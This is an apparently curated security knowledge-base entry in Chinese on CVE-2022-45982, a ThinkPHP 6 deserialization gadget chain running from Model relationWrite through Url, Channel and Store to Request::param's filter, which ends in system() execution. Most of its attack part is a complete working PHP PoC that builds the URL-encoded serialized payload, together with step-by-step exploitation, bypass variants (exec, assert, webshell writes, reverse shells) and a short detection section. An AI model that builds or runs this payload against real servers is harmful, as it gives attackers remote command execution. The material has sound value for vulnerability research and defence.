---
id: web-php-deserialization-thinkphp6-model-relationwrite-store-param-filter-system
title: ThinkPHP 6.0.0~6.0.13 Model 链：relationWrite→autoRelationUpdate→getRelation→save→setAttr 触发 Url.__toString，经 Channel/Store.serialize 落到 Request::param 的 filter 参数执行 system（CVE-2022-45982）
type: scenario
domain: web
path: web/php/deserialization
technique: thinkphp6-model-relationwrite-store-param-filter-system
aliases:
- CVE-2022-45982
- ThinkPHP relationWrite
- autoRelationUpdate getRelation
- think\session\Store serialize
- call_user_func Request param
- filter system RCE
tags:
- php
- thinkphp
- deserialization
- pop-chain
- model
- relation
- serialize
- call_user_func
- rce
cve:
- CVE-2022-45982
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: ThinkPHP 6.0.0~6.0.13 和 6.1.0~6.1.1
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:39:03+08:00'
  notes: 已对照原文核对：data/readonly 造空→updateData 走 autoRelationUpdate→getRelation(true)→exists(true)->save→setAttrs/setAttr→Url::__toString→Channel::__call→record→save→Store::save→serialize(call_user_func)→Request::param→input→filterValue 执行 system，整链与原文图44-60一致；未验证点：原文弹计算器，命令回显形态未在原文截图展示
---

## 一句话结论

ThinkPHP 6（6.0.0~6.0.13、6.1.0~6.1.1）里，把 `Model` 的 `data` 与 `readonly` 布置成"取变更数据后被删空"，就能在 `save → updateData → getChangedData` 走进"无变更"分支的 `autoRelationUpdate()`；其中 `getRelation($name, true)` 取回的 `Pivot` 再次 `save($val)`，`setAttr` 遇到对象值会调用 `__toString` —— 接 `think\route\Url → think\log\Channel::__call → record → think\session\Store::save → serialize` 得到 `call_user_func`, 最终落在 `think\Request::param → input → filterValue` 的 `call_user_func($filter, $value)`，`filter='system'`、`param=['whoami']` 即执行任意命令。

## 原理

- **入口与"造空 data"**：`Model::__destruct` 在 `lazySave` 为真时 `save()`；`save()` 走 `updateData()`（要求 `exists=true`），其中 `$data = $this->getChangedData()`。`getChangedData()` 先 `array_udiff_assoc($this->data, $this->origin, ...)` 或 `force` 直取 `data`，再 `foreach ($this->readonly as $key => $field) { if (array_key_exists($field, $data)) unset($data[$field]); }`。把 `data = ['a'=>'b']`、`readonly = ['a']` 即可让 `$data` 变空。
- **"空 data 反而进关系更新"**：`updateData()` 里 `if (empty($data)) { if (!empty($this->relationWrite)) { $this->autoRelationUpdate(); } ... }` —— 这正是本链与"写库分支"不同之处：它不写数据库，转而处理关联写入。
- **`autoRelationUpdate` 的二次 save**：`foreach ($this->relationWrite as $name => $val)`，若 `$val` 不是 Model 就 `$model = $this->getRelation($name, true);`，`$model instanceof Model` 时执行 `$model->exists(true)->save($val)`。把 `relation = ['r' => $this]`、`relationWrite = ['r' => ['n' => <Url 对象>]]`，`$model` 就是当前 `Pivot` 自身，`$val` 是一维数组。
- **`save($val) → setAttrs → setAttr`**：`setAttrs` 遍历 `$val` 调 `setAttr($key, $value, $data)`；当 `isset($this->type[$name])` 不成立、且 `array_key_exists($name, $this->origin)` 成立且 `$value` 是对象时，执行 `$value = $value->__toString();`。把 `origin = ['n' => <Url 对象>]` 即让 `$name='n'` 命中该分支。
- **`Url::__toString → build → route->getDomainBind`**：`build()` 里 `$bind = $this->route->getDomainBind($domain && is_string($domain) ? $domain : null);`；`route` 设为 `think\log\Channel`，方法不存在 → `__call($method,$parameters)` → `$this->log($method, ...$parameters)`。
- **`Channel::log → record → save`**：`record()` 末尾 `if (! $this->lazy || ! $lazy) { $this->save(); }`，`lazy=false` 直接进 `Channel::save()`，其中 `if ($this->logger->save($log))` —— `logger` 设为 `think\session\Store`。
- **`Store::save → serialize` 是调用器**：`Store::save()` 里 `if (!empty($this->data)) { $data = $this->serialize($this->data); ... }`；`Driver::serialize($data)` 即 `$serialize = $this->serialize[0] ?? 'serialize'; return $serialize($data);` —— 把 `serialize = ['call_user_func']`、`data = [<Request 对象>, 'param']`，于是执行 `call_user_func([<Request>, 'param'])`。
- **`Request::param → input → filterValue` 的最终回调**：`param('')` 在 `mergeParam` 已为 true（属性可控）时不重新合并，直接 `return $this->input($this->param, $name, $default, $filter);`；`input` → `filterData` → `getFilter($filter,$default)` 把字符串 `'system'` 按逗号切分成 `['system']` 并追加 `$default(null)`；`filterValue` 里 `if (is_callable($filter)) { $value = call_user_func($filter, $value); }` —— `$value` 来自 `$this->param`（可控 `['whoami']`），`$filter='system'`，命令执行。
- **为什么每一环都成立**：全部利用点都是"属性可控 + 框架内已有方法语义被复用"（数组下标进 `readonly`/`origin`、对象拼接触发 `__toString`、`__call` 把方法名转日志、`serialize` 配置允许任意可调用名、`filter` 配置允许任意函数名），没有任何一处校验输入。

## 触发条件

- ThinkPHP 6.0.0~6.0.13 或 6.1.0~6.1.1。
- 存在可控 `unserialize` 入口，未限制 `allowed_classes`。
- `think\session\Store`、`think\log\Channel`、`think\route\Url`、`think\model\Pivot` 等类结构未被裁剪。
- `disable_functions` 未禁 `system`（可换其他单参可调用名，见变体）。

## 利用步骤

1. 确认版本落在受影响区间。
2. 构造 payload：`Pivot`（`lazySave=true`、`data=['a'=>'b']`、`exists=true`、`withEvent=false`、`readonly=['a']`、`relation=['r'=>自身]`、`origin=['n'=>Url]`、`relationWrite=['r'=>['n'=>Url]]`）、`Url`（`domain='domain'`、`route=Channel`、`app=App`）、`Channel`（`lazy=false`、`logger=Store`）、`Store`（`serialize=['call_user_func']`、`data=[Request,'param']`）、`Request`（`mergeParam=true`、`param=['whoami']`、`filter='system'`）。
3. `serialize` + `urlencode` 投递到反序列化点。
4. 观察命令是否执行（原文弹计算器；实际换成写文件/反弹）。
5. 若 `system` 被禁，把 `filter` 换成 `assert`、`call_user_func`（配 `param` 为数组）、或 `filter` 指向自定义类方法。

## PoC

```php
<?php
namespace think {
    abstract class Model {
        private $lazySave = true;
        private $data = ['a' => 'b'];
        private $exists = true;
        protected $withEvent = false;
        protected $readonly = ['a'];
        protected $relationWrite;
        private $relation;
        private $origin = [];
        public function __construct($value){
            $this->relation = ['r' => $this];
            $this->origin = ['n' => $value];
            $this->relationWrite = ['r' => ['n' => $value]];
        }
    }
    class App { protected $request; }
    class Request {
        protected $mergeParam = true;
        protected $param = ['whoami'];
        protected $filter = 'system';
    }
}
namespace think\model { use think\Model; class Pivot extends Model {} }
namespace think\route {
    use think\App;
    class Url {
        protected $url = ''; protected $domain = 'domain'; protected $route; protected $app;
        public function __construct($route){ $this->route = $route; $this->app = new App(); }
    }
}
namespace think\log {
    class Channel {
        protected $lazy = false; protected $logger; protected $log = [];
        public function __construct($logger){ $this->logger = $logger; }
    }
}
namespace think\session {
    class Store {
        protected $data; protected $serialize = ['call_user_func']; protected $id = '';
        public function __construct($data){ $this->data = [$data, 'param']; }
    }
}
namespace {
    $request = new think\Request();
    $store   = new think\session\Store($request);
    $channel = new think\log\Channel($store);
    $url     = new think\route\Url($channel);
    $model   = new think\model\Pivot($url);
    echo urlencode(serialize($model));
}
```

关键调用链：

```text
Pivot::__destruct → save() → updateData() → getChangedData()（readonly 删空）
 → autoRelationUpdate() → getRelation('r', true) → $model->exists(true)->save($val)
 → setAttrs → setAttr → $value->__toString()
 → think\route\Url::build() → $route->getDomainBind() → Channel::__call → log/record/save
 → think\session\Store::save() → serialize → call_user_func([Request,'param'])
 → Request::param → input → filterData → filterValue → call_user_func('system','whoami')
```

## 变体与关联

- 变体：`serialize` 换成 `exec`/`passthru`/`assert` 等（`Driver::serialize` 只要求名字可被变量函数语法解析），`data` 的第一个元素换成其他对象即可改变"调用谁"。
- 变体：`filter` 可写成 `['system' => [...]]`、或 `'assert'`（PHP7 下 assert 为函数）；`param` 换成写马内容。
- 关联：[[web-php-deserialization-thinkphp6-model-destruct-tostring-chain]]（前半链的通用版）、[[web-php-deserialization-thinkphp6-conversion-toarray-withattr-callback-rce]]（同为 `__toString` 之后的 Model 回调链，但 sink 是 `withAttr`）、[[web-php-deserialization-thinkphp6-flysystem-cachestore-serialize-system-rce]]（同版本区间、同为"配置即可调用名"的思路）。
- 边界：升级到修复版本、`unserialize` 白名单、`system` 被禁且无其他单参可调用、`session\Store`/`Channel` 结构变化时链失效。

## 检测与防御

- 升级到受影响区间之外的版本；审计 `Model` 的 `relationWrite`/`autoRelationUpdate` 暴露面。
- 不可信输入禁止对象反序列化；必须用时白名单并禁 `think\` 前缀。
- 运行层：`disable_functions` 覆盖 `system`/`exec`/`assert`/`call_user_func` 不现实，但可禁用不必要的 `think\session\Store::serialize` 配置与 `Request::filter` 的可控性（`filter` 来自配置，不应来自对象属性）。
- 检测：反序列化参数中出现 `think%5CModel%00relationWrite`、`think%5Csession%5CStore`、`filter`、`call_user_func`；请求处理后进程派生 `whoami` 等子进程；`unserialize` 调用与后续 `system` 的调用栈关联。
